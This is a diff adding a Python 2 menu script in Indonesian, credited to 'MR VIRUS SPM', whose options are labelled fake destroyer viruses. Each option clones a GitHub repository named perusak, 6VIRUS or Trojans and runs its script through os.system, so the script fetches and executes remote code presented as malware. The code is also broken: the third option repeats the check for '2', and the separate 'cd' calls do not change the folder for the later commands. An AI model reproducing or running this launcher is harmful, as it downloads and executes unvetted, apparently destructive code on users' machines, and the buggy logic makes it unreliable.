@@ -1,0 +1,35 @@
+#!/bin/python
+
+import os,sys,time
+
+def bersih():
+    os.system('clear')
+
+def menu():
+    bersih()
+    print
+    print "           { BY MR VIRUS SPM }"
+    print "=========================================="
+    print
+    print '1). VIRUS PERUSAK FAKE 1'
+    print '2). VIRUS PERUSAK FAKE 2'
+    print '3). VIRUS PERUSAK FAKE 3'
+    print '4). KELUAR'
+    print
+    pill = raw_input("===> ")
+    if pill=="1":
+       os.system("git clone https://github.com/justahackers/perusak")
+       os.system("cd perusak")
+       os.system("python2 perusak.py")
+
+    if pill=="2":
+       os.system("git clone https://github.com/novalattasya/6VIRUS")
+       os.system("cd 6VIRUS")
+       os.system("sh 6VIRUS.sh")
+
+    if pill=="2":
+       os.system("git clone https://github.com/R133F/Trojans")
+       os.system("cd Trojans")
+       os.system("python2 trojans.py")
+
+menu()
